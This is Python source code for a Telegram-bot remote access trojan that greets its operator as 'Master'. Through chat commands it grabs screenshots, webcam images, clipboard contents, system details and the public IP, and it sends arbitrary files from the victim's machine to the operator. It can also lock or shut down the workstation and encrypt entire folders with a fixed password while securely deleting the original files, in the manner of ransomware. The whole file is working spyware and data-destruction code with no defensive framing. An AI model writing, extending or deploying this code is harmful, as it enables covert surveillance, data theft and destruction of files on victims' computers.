import os
import re
import mss
import cv2
import time
import pyttsx3
import telebot
import platform
import clipboard
import subprocess
import pyAesCrypt
from secure_delete import secure_delete

TOKEN = 'YOUR TOKEN'
bot = telebot.TeleBot(TOKEN)
cd = os.path.expanduser("~")
secure_delete.secure_random_seed_init()

def send_message(chat_id, text):
    bot.send_message(chat_id, text)

def execute_command(command, success_msg, error_msg, chat_id):
    try:
        subprocess.run(command, shell=True, check=True)
        send_message(chat_id, success_msg)
    except Exception as e:
        send_message(chat_id, error_msg + f"\nError: {e}")

def list_directory_contents(chat_id):
    try:
        contents = os.listdir(cd)
        send_message(chat_id, "\n".join(f"- {item}" for item in contents) if contents else "Folder is empty.")
    except Exception as e:
        send_message(chat_id, f"An error occurred: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    send_message(message.chat.id, 'Welcome Master')

@bot.message_handler(commands=['help'])
def help_msg(message):
    send_message(message.chat.id, (
        "/screen - Capture screenshot\n/sys - System info\n/ip - Public IP\n"
        "/cd [dir] - Change directory\n/ls - List items\n"
        "/upload [path] - Upload file\n/crypt [path] - Encrypt files\n"
        "/decrypt [path] - Decrypt files\n/webcam - Capture webcam\n"
        "/lock - Lock workstation\n/clipboard - Clipboard content\n"
        "/speech [text] - Text-to-speech\n/shutdown - Shutdown system"
    ))

@bot.message_handler(commands=['screen'])
def send_screen(message):
    try:
        path = os.path.join(cd, "screenshot.png")
        with mss.mss() as sct:
            sct.shot(output=path)
        with open(path, "rb") as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(path)
    except Exception as e:
        send_message(message.chat.id, f"An error occurred: {e}")

@bot.message_handler(commands=['ip'])
def send_ip(message):
    try:
        public_ip = subprocess.check_output("curl ipinfo.io/ip", shell=True).decode().strip()
        send_message(message.chat.id, public_ip)
    except Exception as e:
        send_message(message.chat.id, f"An error occurred: {e}")

@bot.message_handler(commands=['sys'])
def system_info(message):
    info = "\n".join(f"{k}: {v}" for k, v in {
        "Platform": platform.platform(),
        "System": platform.system(),
        "Node": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Cores": os.cpu_count(),
        "User": os.getlogin()
    }.items())
    send_message(message.chat.id, info)

@bot.message_handler(commands=['ls'])
def list_directory(message):
    list_directory_contents(message.chat.id)

@bot.message_handler(commands=['cd'])
def change_directory(message):
    try:
        global cd
        new_dir = " ".join(message.text.split()[1:])
        if new_dir and os.path.isdir(new_path := os.path.join(cd, new_dir)):
            cd = new_path
            send_message(message.chat.id, f"Directory changed to: {cd}")
        else:
            send_message(message.chat.id, "Invalid directory.")
    except Exception as e:
        send_message(message.chat.id, f"An error occurred: {e}")

@bot.message_handler(commands=['upload'])
def upload_file(message):
    try:
        path = " ".join(message.text.split()[1:])
        if os.path.exists(path):
            with open(path, 'rb') as file:
                bot.send_document(message.chat.id, file)
        else:
            send_message(message.chat.id, "File not found.")
    except Exception as e:
        send_message(message.chat.id, f"An error occurred: {e}")

def crypt_files(message, decrypt=False):
    try:
        path = " ".join(message.text.split()[1:])
        password = "password"
        if not os.path.isdir(path):
            raise ValueError("Invalid path.")
        for root, _, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                if decrypt and file.endswith(".crypt"):
                    pyAesCrypt.decryptFile(full_path, full_path[:-6], password)
                    secure_delete.secure_delete(full_path)
                elif not decrypt:
                    encrypted_path = full_path + ".crypt"
                    pyAesCrypt.encryptFile(full_path, encrypted_path, password)
                    secure_delete.secure_delete(full_path)
        send_message(message.chat.id, "Operation completed successfully.")
    except Exception as e:
        send_message(message.chat.id, f"An error occurred: {e}")

@bot.message_handler(commands=['crypt'])
def encrypt(message):
    crypt_files(message)

@bot.message_handler(commands=['decrypt'])
def decrypt(message):
    crypt_files(message, decrypt=True)

@bot.message_handler(commands=['lock'])
def lock_system(message):
    execute_command(["rundll32.exe", "user32.dll,LockWorkStation"], "System locked.", "Failed to lock the system.", message.chat.id)

@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    execute_command(["shutdown", "/s", "/t", "5"], "Shutdown initiated.", "Failed to initiate shutdown.", message.chat.id)

@bot.message_handler(commands=['webcam'])
def capture_webcam(message):
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                path = os.path.join(cd, "webcam.jpg")
                cv2.imwrite(path, frame)
                with open(path, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo)
                os.remove(path)
        cap.release()
    except Exception as e:
        send_message(message.chat.id, f"An error occurred: {e}")

@bot.message_handler(commands=['speech'])
def text_to_speech(message):
    try:
        text = message.text.replace('/speech', '').strip()
        pyttsx3.speak(text)
        send_message(message.chat.id, "Speech completed.")
    except Exception as e:
        send_message(message.chat.id, f"An error occurred: {e}")

@bot.message_handler(commands=['clipboard'])
def get_clipboard(message):
    send_message(message.chat.id, clipboard.paste() or "Clipboard is empty.")

if __name__ == "__main__":
    bot.infinity_polling()
